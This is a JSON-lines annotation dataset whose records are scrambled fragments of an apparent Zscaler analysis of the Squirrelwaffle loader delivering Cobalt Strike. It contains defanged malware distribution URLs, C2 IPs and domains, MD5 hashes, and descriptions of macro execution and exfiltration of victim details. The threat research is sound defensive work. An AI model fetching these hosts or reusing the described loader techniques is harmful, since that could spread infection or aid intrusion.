{"mention": "* 160[.]153[.]129[.]37 port 80 shoeclearanceoutlet[.]co[.]uk", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 160[.]153[.]129[.]37 port 80 mercyfoundationcio[.]org", "sentence_right": "* 160[.]153[.]131[.]187 port 80 spiritofprespa[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "-----------------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Cloud Sandbox Detection", "sentence_right": "![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html", "sentence_right": "### Squirrelwaffle Word Document File MD5 Hashes", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 166[.]62[.]28[.]139 port 80 lead[.]jhinfotech[.]co", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 166[.]62[.]28[.]139 port 80 key4net[.]com", "sentence_right": "* 166[.]62[.]28[.]139 port 80 voip[.]voipcallhub[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://readgasm[.]com/repudiandae-provident/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://procatodicadelacosta[.]com/neque-et/documents.zip", "sentence_right": "* hxxp://rinconadadellago[.]com.mx/qui-quia/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Key Points", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Figure 1: Squirrelwaffle Attack Chain", "sentence_right": "----------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://chaturanga.groopy[.]com/7SEZBnhMLW/130921.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://gruasingenieria[.]pe/LUS1NTVui6/090921.html", "sentence_right": "* hxxps://lotolands[.]com/JtaTAt4Ej/130921.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 5ec89ea30af2cc38ae183d12ffacbcf7", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 7e9ba57db08f53b56715b0a8121bd839", "sentence_right": "* a3ecc9951178447b546b004ea2dfd93f", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://srv7.corpwebcontrol[.]com/np/prog\\_est.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://shahanaschool[.]in/illum-accusamus/documents.zip", "sentence_right": "* hxxp://srv7.corpwebcontrol[.]com/np/user\\_est.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Here, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "sentence_right": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* ef799b5261fd69b56c8b70a3d22d5120", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 116301fd453397fdf3cb291341924147", "sentence_right": "### Cobalt Strike CnC Servers", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "An example decrypted response is shown below:", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim’s system information that was previously sent.", "sentence_right": "**200\\r\\n\\t\\t\\n\\r1631911856\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://lotolands[.]com/JtaTAt4Ej/130921.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://chaturanga.groopy[.]com/7SEZBnhMLW/130921.html", "sentence_right": "* hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 558f97103085394c3a35c9b03839fe72", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* c3bd4145feaaae541cb17ccc7cbd2e44", "sentence_right": "* a07f5b21376cd2b661f36dcdc2081b75", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://systemmentorsec.com/jquery-3.3.1.min.js,*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:", "sentence_right": "*hxxps://213.227.154.92/jquery-3.3.1.min.js*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 116301fd453397fdf3cb291341924147", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Cobalt Strike Stager MD5 Hashes", "sentence_right": "* ef799b5261fd69b56c8b70a3d22d5120", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 202[.]52[.]147[.]113 port 80 amjsys[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 194[.]181[.]228[.]45 port 80 lenartsa[.]webd[.]pro", "sentence_right": "* 203[.]124[.]44[.]95 port 80 novamarketing[.]com[.]pk", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The hidden sheet in this Excel document is shown in Figure 7.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "sentence_right": "![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://gadhwadasamaj.techofi[.]in/expedita-consequatur/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://bussiness-z[.]ml/qui-quia/documents.zip", "sentence_right": "* hxxp://inetworx.co[.]za/voluptate-sunt/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* a449e5044437c453fce2ead881aa8161", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* fae4ca3c95a5068063637b2f2ed3a5b2", "sentence_right": "* c27545fbb3b4ff35277bce1383655e46", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "----------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Key Points", "sentence_right": "* The campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://sextoystore.co[.]in/temporibus-aut/est.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://saraviatowing[.]net/et-praesentium/placeat.zip", "sentence_right": "* hxxps://shivrajengineering[.]in/qui-dolores/placeat.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 166[.]62[.]28[.]139 port 80 key4net[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 166[.]62[.]28[.]139 port 80 jhehosting[.]com", "sentence_right": "* 166[.]62[.]28[.]139 port 80 lead[.]jhinfotech[.]co", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.", "sentence_right": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://moeinjelveh[.]ir/et-eligendi/placeat.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://kmslogistik[.]com/repellat-et/est.zip", "sentence_right": "* hxxps://readgasm[.]com/repudiandae-provident/voluptas.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "---------------------------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Technical Analysis of the Payload", "sentence_right": "This analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* e599a656599a2680c9392c7329d9d519", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* b478bc389fc15e17b231984fa80e2b0d", "sentence_right": "* da48063b7d75ec645f4370b95c28675c", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 216[.]219[.]81[.]3 port 80 hrms[.]prodigygroupindia[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 216[.]219[.]81[.]3 port 80 ems[.]prodigygroupindia[.]com", "sentence_right": "### Cobalt Strike Stager MD5 Hashes", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**t2nQfj3SL3XByImciQTqVa\\t192.168.125.11**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "An example before encryption is shown below:", "sentence_right": "The HTTP POST body contains another Base64 encoded string that includes the victim’s computer name, username, application data directory, and workgroup.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://prevenzioneformazionelavoro[.]it/quasi-reprehenderit/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://insurance.akademiilmujaya[.]com/beatae-sunt/documents.zip", "sentence_right": "* hxxp://procatodicadelacosta[.]com/neque-et/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://tradingview-brokers.skoconstructionng[.]com/molestiae-voluptatum/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://syncun[.]com/natus-aut/documents.zip", "sentence_right": "* hxxps://abogados-en-medellin[.]com/odit-error/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://bussiness-z[.]ml/qui-quia/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://beautifulgist[.]com/id-alias/documents.zip", "sentence_right": "* hxxp://gadhwadasamaj.techofi[.]in/expedita-consequatur/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 2156a1a8b0c579a51ea77d1bc7062b49", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 326498ae163f0d6b8a863d24793f152d", "sentence_right": "* 5e9f33e5baa6d6efca91c8db78c01bd0", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "------------------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Indicators of Compromise", "sentence_right": "### Squirrelwaffle ZIP archive URLs", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 5b50f7beabcff32bd02de2dda2766a7b", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* a07f5b21376cd2b661f36dcdc2081b75", "sentence_right": "### Squirrelwaffle VBS File MD5 Hash", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* cb905bb6a38b5d253eb64aab46eafbd7", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 732ce2ef4b18042ef9e3f3e52ad59916", "sentence_right": "* ebeeef845d0d666363935da89a57b44d", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* c1ed800a4ae9d4efd61de3aa7fd657b4", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 822e20c95df7165009600a9bfbff9b5e", "sentence_right": "* b478bc389fc15e17b231984fa80e2b0d", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 107[.]180[.]12[.]15 port 80 centralfloridaasphalt[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Domain used by the DLL for Squirrelwaffle CnC", "sentence_right": "* 119[.]235[.]250[.]50 port 80 kmslogistik[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 160[.]153[.]131[.]187 port 80 spiritofprespa[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 160[.]153[.]129[.]37 port 80 shoeclearanceoutlet[.]co[.]uk", "sentence_right": "* 166[.]62[.]28[.]139 port 80 jhehosting[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 194[.]181[.]228[.]45 port 80 bartek-lenart[.]pl", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 166[.]62[.]28[.]139 port 80 voipcallhub[.]com", "sentence_right": "* 194[.]181[.]228[.]45 port 80 lenartsa[.]webd[.]pro", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Each field is delimited with two tab characters.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The HTTP POST body contains another Base64 encoded string that includes the victim’s computer name, username, application data directory, and workgroup.", "sentence_right": "An example payload before encryption is shown below:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 160[.]153[.]129[.]37 port 80 mercyfoundationcio[.]org", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 143[.]95[.]80[.]83 port 80 chaturanga[.]groopy[.]com", "sentence_right": "* 160[.]153[.]129[.]37 port 80 shoeclearanceoutlet[.]co[.]uk", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 213.227.154[.]92:443/jquery-3.3.1.min.js", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Cobalt Strike CnC Servers", "sentence_right": "* 213.227.154[.]92:8080/jquery-3.3.1.min.js", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 203[.]124[.]44[.]95 port 80 novamarketing[.]com[.]pk", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 202[.]52[.]147[.]113 port 80 amjsys[.]com", "sentence_right": "* 216[.]219[.]81[.]3 port 80 ems[.]prodigygroupindia[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "This campaign has been running since mid-September 2021.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "In this blog, we will be analyzing the complete attack chain for this new malware family (as shown in Figure 1).", "sentence_right": "The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Attack Chain", "sentence_right": "![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 119[.]235[.]250[.]50 port 80 kmslogistik[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 107[.]180[.]12[.]15 port 80 centralfloridaasphalt[.]com", "sentence_right": "* 143[.]95[.]80[.]83 port 80 chaturanga[.]groopy[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://rinconadadellago[.]com.mx/qui-quia/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://readgasm[.]com/repudiandae-provident/documents.zip", "sentence_right": "* hxxp://saraviatowing[.]net/et-praesentium/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* c2ed8fc614aeda36a7e3a638fa7db16a", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* c774e400b46f4c0bb90c11e349bc36a0", "sentence_right": "* db11964b27738bf4e3a1501e11bd54ad", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html*", "sentence_right": "*hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:", "sentence_right": "*hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* a3ecc9951178447b546b004ea2dfd93f", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 5ec89ea30af2cc38ae183d12ffacbcf7", "sentence_right": "* 9545905ea3735dcac289eead39e3f893", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://inetworx.co[.]za/voluptate-sunt/est.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://focus.focalrack[.]com/enim-rerum/ducimus.zip", "sentence_right": "* hxxps://kmslogistik[.]com/repellat-et/est.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* da48063b7d75ec645f4370b95c28675c", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* e599a656599a2680c9392c7329d9d519", "sentence_right": "* c3bd4145feaaae541cb17ccc7cbd2e44", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 326498ae163f0d6b8a863d24793f152d", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Squirrelwaffle Word Document File MD5 Hashes", "sentence_right": "* 2156a1a8b0c579a51ea77d1bc7062b49", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* c3bd4145feaaae541cb17ccc7cbd2e44", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* da48063b7d75ec645f4370b95c28675c", "sentence_right": "* 558f97103085394c3a35c9b03839fe72", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* a07f5b21376cd2b661f36dcdc2081b75", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 558f97103085394c3a35c9b03839fe72", "sentence_right": "* 5b50f7beabcff32bd02de2dda2766a7b", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 194[.]181[.]228[.]45 port 80 lenartsa[.]webd[.]pro", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 194[.]181[.]228[.]45 port 80 bartek-lenart[.]pl", "sentence_right": "* 202[.]52[.]147[.]113 port 80 amjsys[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
